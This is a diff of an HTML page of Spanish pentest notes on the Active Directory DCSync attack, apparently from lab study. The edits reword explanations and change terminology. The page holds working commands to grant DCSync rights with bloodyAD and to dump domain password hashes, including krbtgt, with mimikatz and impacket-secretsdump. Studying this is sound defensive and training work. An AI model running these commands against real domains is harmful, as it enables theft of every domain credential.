@@ -35,11 +35,11 @@
 
             <p>DCSync permite solicitar replicación de secretos del dominio cuando una cuenta tiene permisos de replicación o puede asignárselos mediante ACL.</p>
 
-            <p><span class="notebook-review-note">Aviso: <code>DCSync attack</code> permite suplantar la identidad de otro DC para extraer hashes del NTDS del AD</span></p>
+            <p><span class="notebook-review-note">Aviso: <code>DCSync attack</code> abusa del protocolo de replicación de AD para solicitar secretos del dominio como si la cuenta tuviera permisos de replicación equivalentes a los de un DC.</span></p>
             <p><span class="notebook-review-note">Aviso: hacen falta permisos DCSync o permisos equivalentes como <code>GenericAll</code> / <code>WriteDACL</code> sobre el dominio.</span></p>
             <p>- <code>DS-Replication-Get-Changes (Replicating Directory Changes)</code></p>
             <p>- <code>DS-Replication-Get-Changes-All (Replicating Directory Changes All)</code></p>
-            <p>Un usuario del grupo <code>Exchange Windows Permissions</code> o con privilegios <code>WriteDACL</code> sobre el dominio (o sobre un usuario en específico por lo que solamente podrá agregarle permisos DCSync a ese usuario) puede asignarse estos permisos y ejecutar el ataque.</p>
+            <p>Un usuario del grupo <code>Exchange Windows Permissions</code> o con privilegios <code>WriteDACL</code> sobre el dominio puede asignarse permisos DCSync y ejecutar el ataque. Si los permisos solo aplican sobre un objeto concreto, el alcance queda limitado a ese objeto.</p>
             <h2>Enumerar Usuarios con Permisos DCSync, WriteDACL o GenericAll</h2>
             <p><a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1">PowerView.ps1</a></p>
             <section class="code-card">
@@ -63,18 +63,18 @@ Add-DomainObjectAcl -Credential $Cred -TargetIdentity &quot;DC=&lt;dominio&gt;,D
               <h3>Kali: Otorgar permisos DCSync</h3>
               <pre><code>bloodyAD --host &lt;hostname&gt;.&lt;dominio&gt; --dc-ip &lt;ip_dc&gt; -d &quot;&lt;dominio&gt;&quot; -u &#x27;&lt;user_actor&gt;&#x27; -p &#x27;&lt;password_actor&gt;&#x27; add dcsync &quot;&lt;user_beneficiado&gt;&quot;</code></pre>
             </section>
-            <h2>Dumpear NTDS (Permisos DCSync)</h2>
+            <h2>Volcar NTDS (Permisos DCSync)</h2>
             <section class="code-card">
-              <h3>PowerShell: Dumpear NTDS.dit con el usuario con permisos DCSync</h3>
+              <h3>PowerShell: Volcar NTDS.dit con el usuario con permisos DCSync</h3>
               <pre><code>mimikatz.exe
 privilege::debug
-# Dumpear NTDS de todos los usuarios del dominio: htb.local
+# Volcar NTDS de todos los usuarios del dominio: htb.local
 lsadump::dcsync /domain:&lt;domain&gt;.&lt;domain&gt; /all
-# Dumpear NTDS de un usuario. Ej. /user:Administrator /user:htb\krbtgt
+# Volcar NTDS de un usuario. Ej. /user:Administrator /user:htb\krbtgt
 lsadump::dcsync /domain:&lt;domain&gt;.&lt;domain&gt; /user:&lt;user&gt;</code></pre>
             </section>
             <section class="code-card">
-              <h3>Kali: Dumpear NTDS con el usuario con permisos DCSync</h3>
+              <h3>Kali: Volcar NTDS con el usuario con permisos DCSync</h3>
               <pre><code># Impacket
 impacket-secretsdump &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip_dc&gt;
 impacket-secretsdump &#x27;&lt;user&gt;:&lt;password&gt;@&lt;ip_dc&gt;&#x27; -just-dc-ntlm
